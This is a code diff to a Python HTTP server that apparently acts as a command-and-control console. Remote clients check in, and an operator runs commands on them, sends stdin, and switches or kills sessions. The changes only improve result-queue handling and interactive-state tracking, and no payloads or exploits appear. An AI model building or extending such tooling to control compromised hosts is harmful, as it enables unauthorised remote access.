@@ -165,8 +165,6 @@ class Handler(BaseHTTPRequestHandler):
                 with lock:
                     client = get_or_create_client(client_id)
                     client["last_checkin"] = time.time()
-                    if "[interactive]" in body:
-                        client["interactive"] = True
             try:
                 result_queue.put_nowait((client_id, "stream", body))
             except queue.Full:
@@ -181,11 +179,24 @@ class Handler(BaseHTTPRequestHandler):
                     client["command_running"] = False
                     client["interactive"] = False
                     client["pending_stdin"] = []
-            # Use blocking put with timeout for /result — must not be silently dropped
-            try:
-                result_queue.put((client_id, "result", body), timeout=2)
-            except queue.Full:
-                pass
+            # Never drop /result — evict old stream chunks if queue is full
+            while True:
+                try:
+                    result_queue.put((client_id, "result", body), timeout=0.1)
+                    break
+                except queue.Full:
+                    try:
+                        result_queue.get_nowait()  # evict oldest (likely a stream chunk)
+                    except queue.Empty:
+                        break
+            self._respond(200, b"ok")
+
+        elif path == "/interactive":
+            # Explicit interactive state flag — no marker parsing needed
+            if client_id:
+                with lock:
+                    client = get_or_create_client(client_id)
+                    client["interactive"] = body.strip().lower() == "true"
             self._respond(200, b"ok")
 
         else:
@@ -247,7 +258,11 @@ def input_loop():
 
         stripped = cmd.strip().lower()
 
-        # --- Built-in commands ---
+        # --- Built-in commands (always handled, even during interactive sessions) ---
+        BUILTINS = {"cancel", "sessions", "status", "help", "exit"}
+        BUILTIN_PREFIXES = ("use ", "kill ", "remove ")
+        is_builtin = stripped in BUILTINS or any(stripped.startswith(p) for p in BUILTIN_PREFIXES)
+
         if stripped == "cancel":
             with lock:
                 if not active_client:
@@ -263,12 +278,13 @@ def input_loop():
                     print(f"[*] No command running on {active_client}.")
             continue
 
-        # While a command is running, forward operator input as stdin.
-        with lock:
-            active_state = clients.get(active_client) if active_client else None
-            if active_state and active_state["command_running"]:
-                active_state["pending_stdin"].append(cmd)
-                continue
+        # While a command is running, forward non-builtin input as stdin.
+        if not is_builtin:
+            with lock:
+                active_state = clients.get(active_client) if active_client else None
+                if active_state and active_state["command_running"]:
+                    active_state["pending_stdin"].append(cmd)
+                    continue
 
         if stripped == "sessions":
             with lock:
